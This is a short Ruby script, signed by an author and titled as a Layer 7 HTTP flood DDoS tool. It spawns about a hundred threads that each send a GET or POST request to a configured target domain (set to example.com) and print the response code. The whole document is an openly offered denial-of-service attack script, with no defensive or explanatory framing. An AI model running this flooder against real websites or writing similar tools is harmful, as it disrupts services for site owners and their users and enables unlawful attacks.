## Bora BOZDOGAN
## Ruby Layer7 (HTTP Flood) DDOS

require "http"
require "thread"

## configuration ##
domain  = 'https://example.com'
count   = 100
type    = "GET"

## configuration ##
def attack(domain,type)
if type == "POST"
code = HTTP.post(domain).code
elsif type == "GET"
code = HTTP.get(domain).code
else
abort('not supported attack type')
end
puts "http code #{code}"
end


start = 0
stop  = count

threads = ("#{start}".."#{stop}").map do |int|  
  Thread.new do
    attack(domain,type) 
  end
end

threads.each(&:join)
